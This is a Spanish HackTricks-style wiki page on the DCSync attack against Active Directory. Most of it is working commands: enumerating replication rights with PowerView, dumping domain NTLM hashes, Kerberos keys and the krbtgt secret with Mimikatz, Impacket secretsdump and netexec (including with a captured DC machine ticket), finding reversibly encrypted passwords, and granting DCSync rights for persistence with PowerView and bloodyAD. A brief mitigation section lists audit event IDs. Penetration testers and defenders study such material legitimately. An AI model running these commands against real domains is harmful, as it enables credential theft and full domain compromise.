# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Notas importantes sobre DCSync:**

- El **ataque DCSync simula el comportamiento de un Domain Controller y solicita a otros Domain Controllers que repliquen información** mediante el Directory Replication Service Remote Protocol (MS-DRSR). Debido a que MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar ni deshabilitar.
- De forma predeterminada, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios necesarios.
- En la práctica, el **DCSync completo** necesita **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** en el contexto de nomenclatura del dominio. `DS-Replication-Get-Changes-In-Filtered-Set` suele delegarse junto con ellos, pero por sí solo es más relevante para sincronizar **atributos confidenciales / filtrados por RODC** (por ejemplo, secretos de estilo LAPS heredado) que para realizar un volcado completo de krbtgt.<sup>[[2]](#references)</sup>
- Si las contraseñas de alguna cuenta están almacenadas mediante cifrado reversible, existe una opción en Mimikatz para devolver la contraseña en texto claro

### Enumeración

Comprueba quién tiene estos permisos usando `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Si quieres centrarte en **principals no predeterminados** con permisos de DCSync, filtra los grupos integrados con capacidad de replicación y revisa únicamente los trustees inesperados:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Explotar localmente
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explotar de forma remota
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Ejemplos prácticos con alcance definido:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync usando un TGT de máquina DC capturado (ccache)

En escenarios de export-mode de unconstrained delegation, puedes capturar un TGT de máquina de un Domain Controller (por ejemplo, `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Luego puedes usar ese ccache para autenticarte como el DC y realizar DCSync sin una contraseña.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas operativas:

- **La ruta de Kerberos de Impacket accede primero a SMB** antes de realizar la llamada a DRSUAPI. Si el entorno aplica **SPN target name validation**, un volcado completo puede fallar con `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- En ese caso, solicita primero un **service ticket para `cifs/<dc>`** del DC objetivo o utiliza `-just-dc-user` para la cuenta que necesites inmediatamente.
- Cuando solo tienes permisos de replicación inferiores, la sincronización mediante LDAP/DirSync todavía puede exponer atributos **confidenciales** o **filtrados por RODC** (por ejemplo, el antiguo `ms-Mcs-AdmPwd`) sin realizar una replicación completa de krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` genera 3 archivos:

- uno con los **hashes NTLM**
- uno con las **claves de Kerberos**
- uno con las contraseñas en texto claro del NTDS para cualquier cuenta que tenga habilitado [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Puedes obtener los usuarios con reversible encryption mediante

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistencia

Si eres administrador del dominio, puedes conceder estos permisos a cualquier usuario con la ayuda de `powerview`:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Los operadores de Linux pueden hacer lo mismo con `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Luego, puedes **comprobar si al usuario se le asignaron correctamente** los 3 privilegios buscándolos en la salida de (deberías poder ver los nombres de los privilegios dentro del campo "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigación

- Security Event ID 4662 (la Audit Policy para objetos debe estar habilitada): se realizó una operación en un objeto<sup>[[4]](#references)</sup>
- Security Event ID 5136 (la Audit Policy para objetos debe estar habilitada): se modificó un objeto del servicio de directorio
- Security Event ID 4670 (la Audit Policy para objetos debe estar habilitada): se cambiaron los permisos de un objeto
- AD ACL Scanner: crear y comparar informes de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referencias

- [1] [Impacket ChangeLog](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: aprovechando Replication Get-Changes y Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: extraer hashes de contraseñas del Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — credenciales de SYSVOL → Kerberoast dirigido → Unconstrained Delegation → DCSync a DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
